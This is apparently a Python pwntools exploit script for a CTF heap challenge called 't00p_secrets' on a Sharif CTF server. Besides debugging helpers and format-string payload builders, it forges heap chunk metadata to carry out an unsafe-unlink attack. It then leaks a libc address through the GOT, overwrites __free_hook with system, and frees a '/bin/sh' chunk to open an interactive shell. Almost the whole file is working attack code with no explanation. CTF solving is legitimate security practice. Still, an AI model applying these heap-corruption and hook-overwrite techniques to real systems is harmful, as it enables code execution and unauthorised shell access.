#!/usr/bin/python
# encoding: utf-8
from  pwn import *
context.clear(arch='x86_64')

import time
import sys
import re
binaire='t00p_secrets'
if (len(sys.argv)>1):
    TIME=0.0
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59993
else:
    host='ctf.sharif.edu'
    port=22107
    libc=ELF('libc-chall.so.6')
    elf=ELF(binaire)
    TIME=0.0
    
def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    tt=complete(t,8)
    for i in range(8):
        s=s+ord(tt[i])*p
        p=p*256
    return(s)

def complete(t,l,c="\x00"):
    if (len(t)< l):
        return(t+(l-len(t))*c)
    else:
        return(t)


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)


def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def adlibc(a):
    return(a-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))

def pause():
    print "Pause...",
    raw_input()

def isprintable(s):
    for c in s:
        if ((ord(c) < 32) or (ord(c)>126)):
            return(False)
    return(True)

def justeapres(s,v):
    return(s[s.index(v)+len(v):])

############


def new(n,l,b,s):
    print "N",n,l,b,s
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(n))
    p.recvuntil(":")
    p.sendline(str(l))
    p.recvuntil(":")
    p.sendline(str(b))
    p.recvuntil(":")
    if (b==0):
        p.send(s)
    else:
        p.sendline(s)
    p.recvuntil(">")

def delete(n):
    print "D",n
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(n))
    p.recvuntil(">")
    
    
def edit(n,b,s):
    print "E",n,b,s
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(n))
    p.recvuntil(":")
    p.sendline(str(b))
    p.recvuntil(":")
    if (b==0):
        p.send(s)
    else:
        p.sendline(s)
    p.recvuntil(">")
    
def secret(n=-1):
    if (n==-1):
        p.sendline("4")
        return(p.recvuntil(">"))
    else:
        p.sendline("5")
        p.recvuntil(":")
        p.sendline(str(n))
        return(p.recvuntil(">"))
    
debug=0
p=remote(host,port)
print p.recvuntil(":")
p.sendline("wjigaep;r[jg]ahrg[es9hrg")
p.recvuntil(">")
Ts=0x100-8
Tb=0x200-8
new(0,Ts,0,"/bin/sh\x00")
new(1,Ts,0,"/bin/sh\x00")


#
new(4,Tb,0,"\x00")
new(5,Tb,0,"\x00")
pointeur=0x6020b8+4*8
#etablit le lien à pointeur - 3*8 soit 1
edit(4,1,"\x00"*8+p64(Tb-7)+p64(pointeur-3*8)+p64(pointeur-2*8)+(Tb-0x28)*"\x00"+p64(Tb-8))
delete(5)
#print secret()
edit(4,0,p64(elf.got['puts']))
#dump(0,secret(1))
b=justeapres(secret(1),"tent: ")
adr_reference_libc=bword(b)
reference_libc='puts'
print '[+] '+reference_libc+' = ',hex(adr_reference_libc)
edit(4,0,p64(tolibc('__free_hook')))
edit(1,0,p64(tolibc('system')))
p.sendline("2")
p.recvuntil(":")
p.sendline("0")

p.interactive()
